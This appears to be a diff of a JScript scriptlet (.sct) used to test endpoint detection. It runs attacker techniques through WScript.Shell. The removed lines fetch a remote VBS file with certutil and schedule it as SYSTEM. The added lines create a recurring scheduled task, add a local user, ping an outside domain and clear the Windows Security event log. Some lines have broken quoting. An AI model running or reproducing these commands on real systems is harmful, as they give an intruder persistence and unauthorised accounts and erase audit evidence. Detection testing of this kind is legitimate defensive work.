@@ -6,9 +6,15 @@
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-			var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://raw.githubusercontent.com/scriptsample/mal/master/edrtest.vbs c:\edrtest.vbs");
-			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn "testtask1" /tr "c:\edrtest.vbs c:\edrtest.zip c:\edrtest.vbs" /sc MINUTE /ru system");
-			]]>
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn "testtask1" /tr "c:\edrtest.vbs" /sc MINUTE");
+			var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all c:¥ipconfig.txt");
+			var r = new ActiveXObject("WScript.Shell").Run("net user /add shigeru123");
+			var r = new ActiveXObject("WScript.Shell").Run("ping nato-press.com");
+			var r = new ActiveXObject("WScript.Shell").Run("wevtutil cl Security");
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “c:\edrtest.vbs” /sc MINUTE");
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “c:\edrtest.vbs” /sc MINUTE");
+
+]]>
 </script>
 </registration>
 </scriptlet>
